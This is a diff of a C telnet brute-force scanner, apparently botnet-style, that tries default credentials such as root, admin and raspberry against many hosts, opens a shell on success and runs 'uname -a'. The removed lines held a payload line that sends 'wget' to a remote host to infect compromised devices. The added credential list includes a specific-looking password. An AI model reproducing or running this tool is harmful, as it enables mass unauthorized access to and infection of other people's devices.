@@ -12,11 +12,11 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
-#include <libssh2.h>
 #include <sys/types.h>
 #include <sys/socket.h>
 #include <arpa/inet.h>
 #include <fcntl.h>
+#include <string.h>
 
 int total_open_host;
 int total_found;
@@ -34,10 +34,8 @@ const char *username[] = {
 };
 
 const char *password[] = {
-	"root", "admin", "password", "raspberry", "pi"
+	"root", "admin", "password", "raspberry", "pi", "Cs6969052!chris"
 };
-
-const char *infectline = "wget devel.bypass.cf/this/shit/works\r\n\r\n";
 
 int negotiate(int sock, unsigned char *buf, int len)
 {
@@ -105,8 +103,8 @@ int readUntil(int fd, char *toFind, int matchLePrompt, int timeout, int timeoutu
                         if(got == -1 || got == 0) return 0;
                         bufferUsed += got;
                         if(!negotiate(fd, initialRead, 3)) return 0;
-                } else if(strstr(buffer, "HTTP/1") == NULL ) {
-                        if(strstr(buffer, toFind) != NULL || (matchLePrompt && matchPrompt(buffer))) { found = 1; printf("%s\n", data->ip); break; }
+                } else if(strcasestr(buffer, "HTTP/1") == NULL ) {
+                        if(strcasestr(buffer, toFind) != NULL || (matchLePrompt && matchPrompt(buffer))) { found = 1; break; }
                 }
         }
 
@@ -144,7 +142,6 @@ void* brute(void *input) {
 
   			if(connect(sock, (struct sockaddr*)(&sin), sizeof(struct sockaddr_in)) != 0) {
 
-				//printf("Connect fucked\n");
 				close(sock);
 				update_done(data->ip);
 				running_threads--;
@@ -152,64 +149,66 @@ void* brute(void *input) {
 
 			}
 
-			if(readUntil(sock, "ogin:", 5, 5, 5000, buffer, 512, bufSize)) {
 
-				sleep(3);
-
-				if(send(sock, username[n], strlen(username[n]), MSG_NOSIGNAL) < 0) { 
-					close(sock);
-					continue;
-				}
-
-                                if(send(sock, "\r\n", 2, MSG_NOSIGNAL) < 0) { 
-					close(sock);
-					continue;
-				}
-                        }
-
-			if(readUntil(sock, "assword:", 1, 0, 5000, buffer, 512, bufSize)) {
-
-				sleep(3);
-
-				if(send(sock, password[i], strlen(password[i]), MSG_NOSIGNAL) < 0) {
-					close(sock);
-					continue;
-				}
-
-				if(send(sock, "\r\n", 2, MSG_NOSIGNAL) < 0) {
-					close(sock);
-					continue;
-				}
-
-			} else if (readUntil(sock, "assword:", 1, 0, 5000, buffer, 512, bufSize)) {
-				close(sock);
-				continue;
-			}
-
-			sleep(3);
-
-			if(send(sock, "sh\r\n", 4, MSG_NOSIGNAL) < 0) {
-				close(sock);
-				update_done(data->ip);
-                                running_threads--;
-				return NULL;
-			}
-
-			if(send(sock, infectline, strlen(infectline), MSG_NOSIGNAL) < 0) {
-				printf("Executed curl\n");
-				close(sock);
-				update_done(data->ip);
-                                running_threads--;
-				return NULL;
-			}
-
-			if(readUntil(sock, "\r\n", 5, 5, 5000, buffer, 512, bufSize)) {
+			if(readUntil(sock, "uthorized", 10, 10, 5000, buffer, 512, bufSize)) {
 				printf("%s\n", buffer);
-
+				if(strcasestr(buffer, "Authorized") != NULL) {
+					close(sock);
+					break;
+				}
 			}
 
-  			close(sock);
-			update_session(data->ip, NULL);
+			printf("%s\n", buffer);
+
+			if(readUntil(sock, "ogin:", 10, 10, 5000, buffer, 512, bufSize)) {
+				if(strcasestr(buffer, "Login") != NULL || strcasestr(buffer, "Username") != NULL) {
+
+					printf("[Attempt Username] %s:%s @ %s:%u", username[n], password[i], data->ip, data->port);
+					if(send(sock, username[n], strlen(username[n]), MSG_NOSIGNAL) < 0) {
+                                	}
+
+                                	if(send(sock, "\r\n", 2, MSG_NOSIGNAL) < 0) {
+                                	}
+                                }
+printf("[Attempt Password] %s:%s @ %s:%u", username[n], password[i], data->ip, data->port);
+			}
+
+			if(readUntil(sock, "assword:", 10, 10, 5000, buffer, 512, bufSize)) {
+
+				if(strcasestr(buffer, "Password") != NULL) {
+
+					if(send(sock, password[i], strlen(password[i]), MSG_NOSIGNAL) < 0) {
+						close(sock);
+						update_entry(data->ip);
+						continue;
+					}
+
+					if(send(sock, "\r\n", 2, MSG_NOSIGNAL) < 0) {
+						close(sock);
+						update_entry(data->ip);
+						continue;
+					}
+				}
+
+			} else if (readUntil(sock, "ncorrect", 10, 10, 5000, buffer, 512, bufSize)) {
+
+				if(strcasestr(buffer, "Invalid") != NULL || strcasestr(buffer, "Incorrect") != NULL) {
+					close(sock);
+					update_entry(data->ip);
+					continue;
+				} else {
+					if(send(sock, "sh\r\n", 4, MSG_NOSIGNAL) < 0) {
+						if(send(sock, "uname -a\r\n", 10, MSG_NOSIGNAL) < 0) {
+						}
+					}
+					if(readUntil(sock, "arch", 10, 10, 5000, buffer, 512, bufSize)) {
+						printf("[Success] %s\n", buffer);
+					}
+
+				}
+			}
+
+ 			close(sock);
 			update_entry(data->ip);
 			update_done(data->ip);
 			return NULL;
